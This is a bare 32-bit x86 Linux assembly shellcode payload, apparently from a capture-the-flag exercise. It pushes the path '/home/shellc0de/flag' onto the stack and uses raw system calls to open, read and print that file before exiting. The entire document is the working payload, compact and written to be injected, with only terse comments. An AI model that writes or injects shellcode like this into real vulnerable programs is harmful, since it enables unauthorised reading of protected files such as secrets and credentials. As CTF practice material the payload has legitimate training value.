
global _start

section .text

_start:
xor ecx, ecx 				; set ecx to 0
xor eax, eax 				; set eax to 0

open:
mov al, 0x05 				; system call 5 is ‘open’
push ecx

push 0x67616c66 ;galf
push 0x2f656430 ;/ed0
push 0x636c6c65 ;clle
push 0x68732f65 ;hs/e
push 0x6d6f682f ;moh/

mov ebx, esp
int 0x80				; call system call

read:
xchg eax, ebx			; exchange value of two register
xchg eax, ecx
mov al, 0x03
mov dx, 0x0FFF
inc edx
int 0x80

write:
xchg eax, edx
mov bl, 0x01
shr eax, 0x0A
int 0x80

exit:
xchg eax, ebx
int 0x80
